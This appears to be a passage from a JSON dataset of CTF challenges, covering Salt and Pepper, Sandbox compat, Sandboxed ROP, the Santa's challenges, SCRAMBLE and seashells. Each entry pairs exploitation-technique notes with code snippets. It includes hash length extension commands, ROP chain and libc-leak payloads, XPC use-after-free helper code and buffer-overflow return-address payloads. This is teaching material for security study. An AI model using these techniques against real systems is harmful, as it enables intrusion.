            "In blockchain-related CTF challenges where you need to interact with smart contracts, fuzzing can be used effectively to discover specific sequences of actions or inputs that transition the system into a desired state (e.g., a state that leads to revealing a flag). This method involves generating a wide range of inputs or sequence of actions to explore the system's behavior with the goal of uncovering vulnerabilities or unintended behaviors. Fuzzing can be particularly useful when the number of possible actions is finite and relatively small, allowing for the exhaustive exploration of the action space.\n\n```python\n# Sample fuzzing code structure\nimport subprocess\nimport itertools\nfrom concurrent.futures import ProcessPoolExecutor\n\n# Define possible choices/actions as candidates\ncands = [(1, 0), (1, 1), (1, 3), (2,), (3,)]\n\n# Generate all possible sequences of actions\nall_sequences = [c + ((4,),) for c in itertools.product(cands, repeat=4)]\n\ndef fuzz_sequence(sequence):  \n   # Code to apply the sequence of actions to the target application\n   # and check for the presence of the flag or desired outcome\n\n# Using multiprocessing to parallelize the fuzzing process\nwith ProcessPoolExecutor(max_workers=4) as executor:  \n   executor.map(fuzz_sequence, all_sequences)  \n```"
        ],
        "key": "```solidity\n// Contract.sol\npragma solidity ^0.8.0;\n\ncontract Sakura {\n    mapping(address => uint256) private balances;\n    address private owner;\n\n    constructor() {\n        owner = msg.sender;\n        balances[owner] = 1000 ether;\n    }\n\n    function bet(uint256 amount) public {\n        require(balances[msg.sender] >= amount, \"Insufficient balance\");\n        balances[msg.sender] -= amount;\n        // Vulnerability: No check on the amount, could lead to integer underflow\n    }\n\n    function finalize() public {\n        if (balances[msg.sender] > 1000 ether) {\n            // Vulnerability: Exposing sensitive information\n            // console.log(k.readFileSync(\"/flag\", \"utf8\"));\n        }\n    }\n\n    function getBalance() public view returns (uint256) {\n        return balances[msg.sender];\n    }\n}\n```"
    },
    {
        "name": "Salt and Pepper",
        "write_up": "dataset/raw/Salt and Pepper.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 71,
        "max_score": 477,
        "difficulty": 0.1488469601677149,
        "knowledge": [
            "In CTF challenges where the application uses hashes for authentication or data integrity checks but doesn't employ a proper hash format, a Hash Length Extension attack can be utilized to bypass security controls when the length and hash of a secret (but not the secret itself) are known. This type of attack takes advantage of the way hashing algorithms like MD5 and SHA-1 process data. To prepare for this, one can use tools like hash_extender, providing it with the known hash, data length, and desired additional data. This generates a new hash and data payload that, when sent to the server, passes authentication checks despite the attacker not knowing the original secret keys (salt and pepper in this context).\n\n    Conditions: Hash Length Extension attacks are effective when:\n    - The application uses vulnerable hashing algorithms like MD5 or SHA-1.\n    - The attacker knows the hash of the secret and the length of the secret.\n    - The application does not employ hash formats designed to be resistant to length extension attacks, such as HMAC.\n\n    Example payload generation using hash_extender:\n    \n    ```\n    ./hash_extender -f md5 -d '' -s [known_md5_salt_hash] -a 'n3T4Dm1n' -l 19\n    ./hash_extender -f sha1 -d '' -s [known_sha1_pepper_hash] -a '[password][generated_md5_signature]' -l 19\n    ```",
            "When testing exploits locally before applying them in a real environment, it can be beneficial to modify the given challenge source code to replace secrets (such as salt and pepper in cryptographic challenges) with known values. This allows for debugging and validation of the exploit's effectiveness without access to the real secrets, offering a predictable environment. This is particularly useful for developing complex attacks (such as Hash Length Extension attacks) where understanding the output and behavior of each step is crucial for success.\n\n    Conditions: Local testing and modification of challenge source code is applicable when:\n    - The source code of the application or challenge is available.\n    - The exploit's success depends on factors (such as cryptographic secrets) that are not known or accessible in the real environment.\n    \n    Example modification for local testing:\n\n    ```\n    salt = b\"A\" * 19  \n    pepper = b\"B\" * 19  \n    flag = \"CCTF{fake_flag_for_testing}\"\n    ```"
        ],
        "key": "```python\ndef auth_check(salt, pepper, username, password, h):  \n\treturn sha1(pepper + password + md5(salt + username).hexdigest().encode('utf-8')).hexdigest() == h\n```"
    },
    {
        "name": "Sandbox compat",
        "write_up": "dataset/raw/Sandbox compat.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 420,
        "max_score": 500,
        "difficulty": 0.84,
        "knowledge": [
            "In memory corruption challenges, particularly sandbox escape scenarios, when the challenge setup involves transitioning between userland and kernelland (kernel mode code execution), inspecting how the `flags` register is managed during this transition is crucial. A possible attack vector is manipulating the `direction flag` (DF) to alter the behavior of string instructions like `rep movs`, commonly used in functions like `memcpy`. This manipulation can lead to controlled modification of memory regions, including the stack, allowing for exploitation and arbitrary code execution.\n   \n   Sample exploitation principle (not exact payload due to context specifics):\n   ```asm\n   std                    ; Set direction flag\n   push    <some_value>   ; Prepare values/addresses on stack\n   push    <return_address_or_gadget> \n   retf                   ; Trigger far return to switch stacks or execution context assuming control over stack contents\n   ```",
            "When bypassing sandbox implementations or similar restrictions in CTF challenges designed to limit system calls or direct access to sensitive resources, leveraging already available code gadgets within the binary or the system's API, such as the PlT/GOT entries for `syscall`, can be effective. This approach is particularly useful when direct syscalls are restricted by SECCOMP rules or other security mechanisms. Constructing a ROP chain to perform syscalls indirectly allows for actions like opening, reading, and writing files despite restrictions.\n\n   Sample exploitation strategy:\n   - Use a controlled overwrite (via previous point exploit strategy) to redirect execution to a `syscall; ret;` gadget.\n   - Prepare registers for the desired syscall (e.g. `open`, `read`, `write`) using stack setup or additional gadgets.\n   - Trigger the gadget to perform the syscall indirectly, bypassing filters on direct syscall execution. \n\n   ```asm\n   ;; ROP chain to execute open(\"flag\", O_RDONLY) indirectly \n   mov rdi, <address_of_string_flag>   ; Address pointing to the string \"flag\\0\"\n   mov rsi, O_RDONLY                   ; 0, Open for reading only\n   mov rax, __NR_open                  ; Syscall number for open\n   call <syscall_gadget>               ; Execute the syscall indirectly\n   ```"
        ],
        "key": "```c\nint path_ok(char *pathname, const char *p)  \n{  \n if (!access_ok(p, MAX_PATH))  \n   return 0;\n\n memcpy(pathname, p, MAX_PATH);  \n pathname[MAX_PATH - 1] = '\\x00';\n\n if (strstr(pathname, \"flag\") != NULL)  \n   return 0;\n\n return 1;  \n}  \n```\n\n```assembly\n       BITS    64\n\n       ...\n\n       mov     rax, fs  \n       test    rax, rax  \n       jnz     bad  \n       mov     rax, gs  \n       test    rax, rax  \n       jnz     bad\n\n       ;; save rsp into rbx  \n       mov     rbx, rsp\n\n       ;; setup stack  \n       mov     rsp, 0xdeadbeefdeaddead         /* replaced with top of the stack */  \n       push    rbx\n\n       ;; call kernel function  \n       mov     rax, 0xdeadbeefdeadc0de         /* replaced with address of `kernel` subroutine */  \n       call    rax\n\n       ;; restore rsp back to rbx  \n       pop     rbx  \n       mov     rsp, rbx\n\n       ;; trampoline to 32-bit code (segment selector 0xf)  \n       ;; 0xfffffff5: ret gadget  \n       mov     rcx, 0xffffffff5  \n       push    rcx  \n       retf\n\nbad:  \n       ud2  \n```\n\n```c\n struct user_desc desc;  \n ...\n\n memset(&desc, 0, sizeof(desc));  \n desc.entry_number = 1;  \n desc.base_addr = 0;  \n desc.limit = (1L << 32) - 1;  \n desc.seg_32bit = 1;  \n desc.contents = 2;                            /* MODIFY_LDT_CONTENTS_CODE */  \n desc.read_exec_only = 0;  \n desc.limit_in_pages = 1;  \n desc.seg_not_present = 0;  \n desc.useable = 1;  \n```"
    },
    {
        "name": "Sandbox Share",
        "write_up": "dataset/raw/Sandbox Share.md",
        "type": "pwn",
        "competition": [
            "ALLES/2021",
            "https://ctftime.org/event/1313/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting XPC (Cross-Process Communication) services in macOS for privilege escalation or sandbox escape, creating a UAF (Use-After-Free) condition by manipulating object lifecycle (create, use, delete) through XPC messages can lead to arbitrary code execution. This technique involves sending crafted XPC messages to deliberately create a controlled heap layout, then forcing the target service to reuse freed objects with attacker-controlled data. A sequence to achieve this includes cleaning the heap with tiny allocations, creating UAF objects, deallocating them, and finally reusing these objects with malicious payloads to hijack the control flow.",
            "For leveraging Use-After-Free vulnerabilities effectively, especially in scenarios involving complex memory management (like in macOS sandbox environments), understanding the target's memory allocation patterns is crucial. This can be achieved by creating and deleting a large number of objects to \"clean\" and prepare the heap, ensuring that the memory to be reclaimed (freed and subsequently reallocated) is predictably controlled. This prepares the environment for injecting and executing the payload by placing it in the memory location expected to be reused after a free operation. This approach allows for precise manipulation of memory states to exploit memory corruption vulnerabilities."
        ],
        "key": "```objc  \nint register_client(task_port_t task_port) {  \n   xpc_object_t message, reply;\n\n   message = xpc_dictionary_create(NULL, NULL, 0);  \n   xpc_dictionary_set_uint64(message, \"op\", 1);  \n   xpc_dictionary_set_mach_send(message, \"task\", task_port);  \n  \n   reply = xpc_connection_send_message_with_reply_sync(connection, message);\n\n   if(xpc_dictionary_get_int64(reply, \"status\")) {  \n       const char *error = xpc_dictionary_get_string(reply, \"error\");  \n       printf(\"[-] Error register_client: %s\\n\", error);  \n       return -1;  \n   }\n\n   const char *result = xpc_dictionary_get_string(reply, \"client_id\");  \n  \n   client_id = calloc(1, 9);  \n   strncpy(client_id, result, 9);\n\n   return 0;  \n}\n\nuint64_t create_entry(xpc_object_t object, uint64_t token_index, char *UIDs) {  \n   xpc_object_t message, reply;\n\n   message = xpc_dictionary_create(NULL, NULL, 0);  \n   xpc_dictionary_set_uint64(message, \"op\", 2);  \n   xpc_dictionary_set_string(message, \"client_id\", client_id);  \n   xpc_dictionary_set_value(message, \"data\", object);  \n   xpc_dictionary_set_string(message, \"UIDs\", UIDs);  \n   xpc_dictionary_set_uint64(message, \"token_index\", token_index);  \n  \n   reply = xpc_connection_send_message_with_reply_sync(connection, message);  \n   // printf(\"create_entry reply: \\n%s\\n\", xpc_copy_description(reply));\n\n   if(xpc_dictionary_get_int64(reply, \"status\") != 0) {  \n       const char *error = xpc_dictionary_get_string(reply, \"error\");  \n       printf(\"[-] Error create_entry: %s\\n\", error);  \n       return -1;  \n   }\n\n   return xpc_dictionary_get_uint64(reply, \"index\");  \n}\n\nxpc_object_t get_entry(uint64_t index) {  \n   xpc_object_t message, reply;\n\n   message = xpc_dictionary_create(NULL, NULL, 0);  \n   xpc_dictionary_set_uint64(message, \"op\", 3);  \n   xpc_dictionary_set_string(message, \"client_id\", client_id);  \n   xpc_dictionary_set_uint64(message, \"index\", index);\n\n   reply = xpc_connection_send_message_with_reply_sync(connection, message);  \n   // printf(\"get_entry reply: \\n%s\\n\", xpc_copy_description(reply));\n\n   if(xpc_dictionary_get_int64(reply, \"status\") != 0) {  \n       const char *error = xpc_dictionary_get_string(reply, \"error\");  \n       printf(\"[-] Error get_entry: %s\\n\", error);  \n       return (xpc_object_t)-1;  \n   }\n\n   return xpc_dictionary_get_value(reply, \"data\");  \n}\n\nint delete_entry(uint64_t index) {  \n   xpc_object_t message, reply;\n\n   message = xpc_dictionary_create(NULL, NULL, 0);  \n   xpc_dictionary_set_uint64(message, \"op\", 4);  \n   xpc_dictionary_set_string(message, \"client_id\", client_id);  \n   xpc_dictionary_set_uint64(message, \"index\", index);\n\n   reply = xpc_connection_send_message_with_reply_sync(connection, message);\n\n   if(xpc_dictionary_get_int64(reply, \"status\") != 0) {  \n       const char *error = xpc_dictionary_get_string(reply, \"error\");  \n       printf(\"[-] Error delete_entry: %s\\n\", error);  \n       return -1;  \n   }\n\n   return 0;  \n}\n```"
    },
    {
        "name": "Sandboxed ROP",
        "write_up": "dataset/raw/Sandboxed ROP.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 445,
        "max_score": 500,
        "difficulty": 0.89,
        "knowledge": [
            "When dealing with challenges protected by `seccomp` that restrict the set of available syscalls, one can still perform limited operations like reading, writing, and opening files. This restricts the exploit developer to using only the allowed syscalls to interact with the system. It's essential to analyze the `seccomp` rules set via tools like `seccomp-tools` to understand the allowed syscalls and plan an exploit accordingly. Crafting a ROP chain becomes a vital skill here, using the gadgets available within the given constraints to perform operations like leaking libc addresses or manipulating file descriptors.",
            "In scenarios where direct execution of useful syscalls is not possible due to restrictions like `seccomp`, one may need to leak libc addresses to call functions like 'open', 'read', and 'write' by computing the libc base address and then using it to calculate the addresses of the needed libc function. This process generally involves finding a leak primitive to send out addresses of known symbols (e.g., using the `puts` function to leak the address of a libc function present in the GOT), and then using an online libc database (e.g., libc.blukat.me) to identify the exact libc version and calculate the base address.\n\n- Example Leak Primitive Payload: To leak an address, a sample payload might prepare a ROP chain that places the GOT entry of a known function (like `puts`) into the RDI register (via a `pop rdi; ret` gadget) before calling `puts` to print out the address. Then, it adjusts the stack to continue execution gracefully, which could look similar to this simplified Python snippet:\n```python\nfrom pwn import *\n\n# Assuming we have the necessary addresses and the binary loaded into 'exe':\nputs_got_addr = exe.got['puts']\npop_rdi_ret = 0x00000000004013a3  # This is hypothetical and will depend on the exact binary\nputs_plt = exe.plt['puts']\ncontinue_execution_addr = 0x400xxx  # Address to continue execution after the leak\n\npayload = flat([\n    'A'*buffer_overflow_offset,  # Padding to reach the return address\n    pop_rdi_ret,\n    puts_got_addr,\n    puts_plt,\n    continue_execution_addr\n])\n```\nThis payload, when sent as part of an exploit under appropriate conditions (like after overflowing a buffer), would leak the runtime address of `puts`, which can then be used to calculate the base address of libc."
        ],
        "key": "```c\nundefined8 main(EVP_PKEY_CTX *param_1)\n\n{  \n undefined buffer [16];  \n  \n init(param_1);  \n init_seccomp();  \n puts(\"pwn dis shit\");  \n read(0,buffer,0x200);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Santa's ELF holomorphing machine",
        "write_up": "dataset/raw/Santa's ELF holomorphing machine.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that involve holomorphic functions, the Cauchy-Riemann equations are crucial for computing missing function components. If given the real part \\(u(x,y)\\) or the imaginary part \\(v(x,y)\\) of a holomorphic function \\(f(z)\\), one can derive the other part using these equations: \\(du/dx = dv/dy\\) and \\(du/dy = -dv/dx\\). This method allows for the reconstruction of the entire function given just half of its components, assuming an integration constant of zero.",
            "In challenges involving complex functions and visual output, plotting the computed values of a function can reveal hidden messages or flags. When a challenge output appears to be inverted or not correctly oriented, adjusting the coordinates (for example, inverting the y-coordinate by a fixed value) before plotting can unveil the correct visual representation of the flag or message."
        ],
        "key": "```python\n#!/usr/bin/sage  \nimport matplotlib.pyplot as plt  \nll = list()  \nllx = list()  \nlly = list()  \nfor _ in range(802):  \n   line = input()  \n   uvs, zs = line.split('; ')  \n   uv, uvt = uvs.split(' =')  \n   zt = zs.split(' = ')[1]  \n   uva, uvb = uvt.split(' + ')  \n   uva, uvb = int(uva.split(' * ')[0]), int(uvb.split(' * ')[0])  \n   zx, zy = zt.split(' + ')  \n   zx, zy = float(zx), float(zy.split('*')[0])  \n   xx, yy = 0, 0  \n   if uv == 'u':  \n       xx =  uva * zx + uvb * zy  \n       yy = -uvb * zx + uva * zy  \n       pass  \n   else:  \n       xx =  uvb * zx - uva * zy  \n       yy =  uva * zx + uvb * zy  \n       pass  \n   yy = 20 - yy  \n   print(xx, yy)  \n   ll.append((xx, -yy))  \n   llx.append(xx)  \n   lly.append(yy)  \n   pass  \nplt.scatter(llx, lly)  \nplt.show()  \n```"
    },
    {
        "name": "Santa's list 2",
        "write_up": "dataset/raw/Santa's list 2.0.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": -1.0,
        "max_score": 591,
        "difficulty": -1,
        "knowledge": [
            "In textbook RSA encryption, if the encryption process directly operates on plaintext without additional randomness or padding, the ciphertext is malleable. This means that one can manipulate the ciphertext in a predictable way without decrypting it. Specifically, if one can perform operations on the ciphertext such as multiplication with another encrypted value, the plaintext can be indirectly modified. This vulnerability allows an attacker to bypass certain restrictions on direct plaintext manipulation by instead manipulating the ciphertext. For instance, multiplying the ciphertext of the flag with the ciphertext of a known value (like `-1` or `2`) and then decrypting the result can reveal altered forms of the original plaintext, from which the true plaintext (flag) can be deduced. \n\n    Example manipulation:\n    - Original encryption: `ct_flag = encrypt(flag) = flag^e mod n`\n    - Manipulate by multiplying with `encrypt(-1)`: `ct_not_flag = ct_flag * encrypt(-1) = (flag * -1)^e mod n`\n    - The decryption of `ct_not_flag` yields `flag * -1 mod n`, from which `flag` can be recovered if `n` is known.",
            "The RSA modulus `n` can be determined if one has the ability to encrypt arbitrary plaintexts under the target public key `(n, e)`. Assuming `e` is known (commonly `e = 65537`), one can calculate `n` by exploiting the fact that `m**e - encrypt(m)` is a multiple of `n` for any message `m`. By encrypting two (or more) distinct messages and computing the greatest common divisor (GCD) of their respective differences (`m**e - encrypt(m)`), one can recover `n`. This technique is particularly useful when the public key is not directly provided, but encryption can be performed with known plaintexts. \n\n    Example code to calculate `n`:\n    ```python\n    e = 65537\n    def get_resid(i):  \n        return i**e - encrypt(i)\n\n    def get_n():  \n        curr = get_resid(bytes_to_long('a'))  \n        for i in [bytes_to_long('b'), bytes_to_long('c')]:  \n            curr = GCD(curr, get_resid(i))  \n        return curr\n    ```"
        ],
        "key": "```python\nfor i in range(5):  \n   if choice == '1':  \n       m = bytes_to_long(input('\\nPlaintext > ').strip().encode())  \n       print('\\nEncrypted: ' + str(encrypt(m)))  \n   elif choice == '2':  \n       c = int(input('\\nCiphertext > ').strip())  \n       if c == flag_encrypted:  \n           print('Ho, ho, no...')  \n       else:  \n           print('\\nDecrypted: ' + str(m))  \n```\n\n```python\ne = 65537  \ndef get_resid(i):  \n\treturn i**e - encrypt(i)\n\ndef get_n():  \n\tcurr = get_resid(bytes_to_long('a'))  \n\tfor i in [bytes_to_long('b'), bytes_to_long('c')]:  \n\t\tcurr = GCD(curr, get_resid(i))  \n\treturn curr  \n```"
    },
    {
        "name": "Santa's list",
        "write_up": "dataset/raw/Santa's list.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 286,
        "max_score": 591,
        "difficulty": 0.48392554991539766,
        "knowledge": [
            "In the context of RSA encryption where textbook RSA is used and the plaintext is malleable, one can exploit the malleability by creating a manipulated ciphertext that, when decrypted, results in a predictable transformation of the original plaintext. This approach includes multiplying the original ciphertext (`ct_flag`) by another encrypt function output (`ct_neg` or `ct_two`) under the same modulus to produce a new ciphertext (`ct_not_flag`) that can be decrypted into a manipulated plaintext. \n   - Example manipulations:\n     - Multiplying the flag ciphertext by the ciphertext of 2 to decrypt it into `flag*2`.\n     - Multiplying the flag ciphertext by the ciphertext of -1 (`encrypt(-1)`) to decrypt it into `flag*-1 mod n`.",
            "To exploit the RSA encryption, it's crucial to obtain the public key components, which are `n` (modulus) and `e` (public exponent). While the public exponent `e` often defaults to 65537, obtaining `n` might require more effort. A method to discover `n` is to encrypt arbitrary values (`m`), and use the difference between `m**e` and `encrypt(m)` to find `n` through the Greatest Common Divisor (GCD) of several such differences. This method relies on the premise that `m**e - encrypt(m)` is a multiple of `n`.\n   - Example code to find `n` using GCD:\n     ```python\n     e = 65537\n     def get_resid(i):\n         return i**e - encrypt(i)\n\n     def get_n():\n         curr = get_resid(bytes_to_long('a'))\n         for i in [bytes_to_long('b'), bytes_to_long('c')]:\n             curr = math.gcd(curr, get_resid(i))\n         return curr\n     ```"
        ],
        "key": "```python\nfor i in range(5):  \n   if choice == '1':  \n       m = bytes_to_long(input('\\nPlaintext > ').strip().encode())  \n       print('\\nEncrypted: ' + str(encrypt(m)))  \n   elif choice == '2':  \n       c = int(input('\\nCiphertext > ').strip())  \n       if c == flag_encrypted:  \n           print('Ho, ho, no...')  \n       else:  \n           print('\\nDecrypted: ' + str(m))  \n```\n\n```python\ne = 65537  \ndef get_resid(i):  \n\treturn i**e - encrypt(i)\n\ndef get_n():  \n\tcurr = get_resid(bytes_to_long('a'))  \n\tfor i in [bytes_to_long('b'), bytes_to_long('c')]:  \n\t\tcurr = GCD(curr, get_resid(i))  \n\treturn curr  \n```"
    },
    {
        "name": "Santa's public key factory",
        "write_up": "dataset/raw/Santa's public key factory.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 226,
        "max_score": 500,
        "difficulty": 0.452,
        "knowledge": [
            "When facing RSA encryption challenges, especially ones that involve generating primes in a specific way, if the method leaks some information about the structure of the primes (such as using a set of exponents to form the primes), multiple public keys can be analyzed to find common factors or to deduce the exponents used in generating the primes. This can lead to the factorization of \\(n=p \\times q\\), allowing decryption using the private key derived from \\(\\phi(n)\\) and \\(e\\).",
            "In challenges where you can obtain multiple instances of related data (like public keys with partially predictable primes), leveraging statistical or brute force methods to analyze and find patterns or repeated elements can lead to breaking the encryption. Specifically, collecting a significant sample, analyzing for common or repeated components (like the top 20 exponents across several primes), and then using combinations of these components to guess the factors efficiently can be a successful strategy. Following this, using `gmpy2.next_prime()` or similar functions can assist in testing hypotheses about the structure of primes and eventually factorizing \\(n\\) for RSA decryption.\n\nExample of a Python snippet to attempt RSA prime factorization based on predictable prime structure:\n```python\nfrom Crypto.Util.number import inverse\nimport gmpy2\nfrom itertools import combinations\n\n# Assume n is the RSA modulus and the partially predictable structure leads to a reduced set of possible prime factors\npossible_exponents = [exp1, exp2, ...] # Derived from analysis\n\nfor i in range(1, len(possible_exponents) + 1):\n    for exp_set in combinations(possible_exponents, i):\n        # Construct a potential prime\n        potential_prime = 2**1023  # Starting point based on specific scenario\n        for exp in exp_set:\n            potential_prime += 2**exp\n        potential_prime = gmpy2.next_prime(potential_prime)\n\n        if n % potential_prime == 0:\n            p = potential_prime\n            q = n // p\n            phi = (p-1) * (q-1)\n            e = 65537  # Commonly used public exponent\n            d = inverse(e, phi)  # Compute the private exponent\n            print(f\"Success: p={p}, q={q}\")\n            break\n```"
        ],
        "key": "```python\nclass chall:  \n   def __init__(self, size, bits):  \n       self.rnd = SystemRandom()  \n       self.bits = bits  \n       self.size = size  \n       self.exp = self.rnd.sample(range(32, size - 1), bits)\n\n   def get_rand_int(self):  \n       res = 2** (self.size - 1)  \n       for i in range(self.bits):  \n           if self.rnd.randint(0, 1) == 1:  \n               res += 2**self.exp[i]  \n       return res\n\n   def get_prime(self):  \n       return int(next_prime(self.get_rand_int()))\n\n   def get_key(self):  \n       p = self.get_prime()  \n       q = self.get_prime()  \n       e = 0x10001  \n       n = p * q  \n       phi = (p - 1) * (q - 1)  \n       d = inverse(e, phi)\n\n       pubkey = (n, e)  \n       privkey = (n, e, d, p, q)\n\n       return (pubkey, privkey)\n\n   def encrypt(self, pt, pubkey):  \n       n, e = pubkey  \n       return pow(pt, e, n)\n\n   def decrypt(self, ct, privkey):  \n       n, e, d, p, q = privkey  \n       return pow(ct, d, n)  \n```"
    },
    {
        "name": "SCRAMBLE",
        "write_up": "dataset/raw/SCRAMBLE.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 378,
        "max_score": 960,
        "difficulty": 0.39375,
        "knowledge": [
            "In challenges involving guessing a correct sequence (like strings or numbers) with limited attempts and receiving feedback for each guess, creating a function that methodically eliminates impossible choices based on this feedback improves efficiency and accuracy. This can be achieved by analyzing the feedback for presence, absence, and correct positioning of elements to narrow down the potential correct answers from a given list.\n   - Example function structure in Python can include comparing each character's feedback indicator and removing words from the wordlist that do not match the criteria established by the feedback.\n   \n     ```py\n     def eliminate(feedback, guess, wordlist):\n         result = []\n         for word in wordlist:\n             match = True\n             for i in range(len(guess)):\n                 if feedback[i] == \"*\" or feedback[i] == \"+\":\n                     if guess[i] not in word:\n                         match = False\n                 if feedback[i] == \"+\":\n                     if guess[i] != word[i]:\n                         match = False\n                 if feedback[i] == \"-\":\n                     if guess[i] in word:\n                         match = False\n             if match and word != guess:\n                 result.append(word)\n         return result\n     ```",
            "When facing binary reverse engineering challenges where the goal is to find a specific state or output (such as the \"Correct!\" message), utilizing symbolic execution frameworks like angr can automate the exploration of different execution paths to reach the desired state efficiently. This approach can significantly reduce the time and effort required as opposed to manually analyzing and tracing through the binary's logic.\n    - To achieve this, identify the memory address or function call associated with the desired outcome, and configure the symbolic execution tool to explore execution paths towards this target.\n   \n      ```python\n      import angr\n\n      proj = angr.Project(\"./binary_name\")\n\n      target_addr = 0xTargetAddress\n\n      state = proj.factory.entry_state()\n      simgr = proj.factory.simgr(state)\n      simgr.explore(find=target_addr)\n      found_state = simgr.found[0]\n      print(found_state.posix.dumps(0))\n      ```"
        ],
        "key": "```python  \ndef eliminate(res, guess, wl):  \n   result = []  \n   for e in wl:  \n       flg = True  \n       for i in range(5):  \n           if res[i] == \"*\" or res[i] == \"+\":  \n               if guess[i] not in e:  \n                   flg = False  \n           if res[i] == \"+\":  \n               if guess[i] != e[i]:  \n                   flg = False  \n           if res[i] == \"-\":  \n               if guess[i] in e:  \n                   flg = False  \n       if flg and e != guess:  \n           result.append(e)  \n   return result  \n```"
    },
    {
        "name": "Scrambled Eggs",
        "write_up": "dataset/raw/Scrambled Eggs.md",
        "type": "crypto",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": 499,
        "max_score": 2000,
        "difficulty": 0.2495,
        "knowledge": [
            "When dealing with encryption algorithms that involve character mapping and array rotations, understand the encryption mechanisms fully to accurately reverse them. One common tactic is reversing character mappings using a predefined map or character array, and applying inverse rotation based on the encryption steps. Applying the reverse operations in the correct order is crucial. For character re-mapping, one might implement a function like `dec2(text)` that inversely maps each encrypted character back to its original form based on the mapping used during encryption.\n   \n   Example payload (For `enc2` reversal):\n   ```python\n   def dec2(text, map):  \n       return ''.join(chr(map.index(char) + ord('a')) for char in text)  \n   ```",
            "In scenarios involving encryption or obfuscation techniques that use random numbers or operations with a degree of randomness, brute-forcing through possible outcomes can be a necessary approach, especially when certain steps in the encryption process are non-deterministic from an outside perspective (e.g., rotations based on random numbers). However, analyzing the parts of an algorithm that can be reversed without brute force is essential to reduce the problem space. For instance, reversing operations that append characters based on deterministic logic can often be done without brute force by understanding the transformation rules and applying the inverse operations accordingly.\n\n   Example payload (For reversing operations with appended characters):\n   ```python\n   def recover_key2(ekey2):  \n       k = ekey2[:14]  # Assuming first 14 chars are appended ones\n       # The rest of the function follows the logic to accurately deduce the original characters before appending\n   ```"
        ],
        "key": "```python\nimport random  \nimport sys\n\nmap = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i',\n'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']\n\nflag = 'csictf{this_is_a_fake_flag}'  \nflag = flag.replace('{','a')  \nflag = flag.replace('}','a')  \nflag = flag.replace('_','b')  \nkey1 = 'ashikka_is_mine'  \nkey1 = key1.replace('_','b')\n\nif(len(flag) != 28 or len(key1) != 14):  \n   exit()  \n  \nflag = list(flag)  \nkey1 = list(key1)\n\ndef enc1(text):  \n   n = random.randint(0,sys.maxsize%28)  \n   return text[n:] + text[:n]  \n  \nflag = enc1(flag)  \n  \ndef enc2(text):  \n   temp = ''  \n   for i in text:  \n       temp += map[ord(i)-ord('a')]  \n   return temp\n\nkey2 = enc2(enc2(key1))  \nkey2 = list(key2)\n\nfor j in range(2):  \n   for i in range(14):  \n       temp1 = flag[i]  \n       flag[i] = flag[(ord(key1[i])-ord('a'))%28]   \n       flag[(ord(key1[i])-ord('a'))%28] = temp1  \n       temp2 = key1[i]  \n       key1[i] = key1[(ord(key2[i])-ord('a'))%14]   \n       key1[(ord(key2[i])-ord('a'))%14] = temp2  \n  \n  \n   for i in range(14,28):  \n       temp1 = flag[i]  \n       flag[i] = flag[(ord(key2[i-14])-ord('a'))%28]   \n       flag[(ord(key2[i-14])-ord('a'))%28] = temp1  \n       temp2 = key2[i-14]  \n       key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14]   \n       key2[(ord(key1[i-14])-ord('a'))%14] = temp2  \n\nl = random.sample([key1, key2], 2)  \nkey1 = l[0]  \nkey2 = l[1]\n\nk = ''  \nfor i in range(14):  \n   k += random.choice(map)  \nk = list(k)\n\nkey2 = k+key2  \nfor i in range(14):  \n   a = ord(k[i])-ord('a')+ord(key2[i+14])  \n   if a>122:  \n       a=a%122  \n       a=a+97  \n   key2[i+14]= chr(a)\n\nflag = ''.join(flag)  \nkey1 = ''.join(key1)  \nkey2 = ''.join(key2)  \n  \nkey2 = enc2(key2)  \nflag= enc1(enc1(enc1(enc2(flag))))\n\nprint('Encrytped key1 = '+key1)  \nprint('Encrypted key2 = '+key2)  \nprint('Encrypted flag = '+flag)  \n```"
    },
    {
        "name": "seashells",
        "write_up": "dataset/raw/seashells.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "In a challenge involving buffer overflow vulnerabilities, especially when the `gets` function is used, it's crucial to determine the proper buffer size to overwrite the return address. This can be achieved by using a cyclic pattern technique with a debugging tool like gdb to find where the program crashes, thereby identifying the offset. After locating the offset, the next step involves crafting a payload that overwrites the return address with the desired function's address to gain control over the program flow. In scenarios where security features like PIE (Position Independent Executable) and stack canaries are disabled, this method is particularly effective.\n   \n   Example payload segment: `payload = b'a'*offset + p64(shell_addr)`",
            "When the target binary has a specific function that grants desired access or functionality (e.g., a shell function that executes a system call to open a shell), and there's no PIE enabled, one can locate the function's address using a tool like gdb. The payload can then include this address to redirect execution flow directly to that function, effectively bypassing any intended logic or checks the program initially performs. This is especially applicable in scenarios where the binary directly includes a call to a critical function like `system()` without proper input validation or checks.\n\n   Example payload construction: `payload = b'a'*offset + p64(shell_addr)`"
        ],
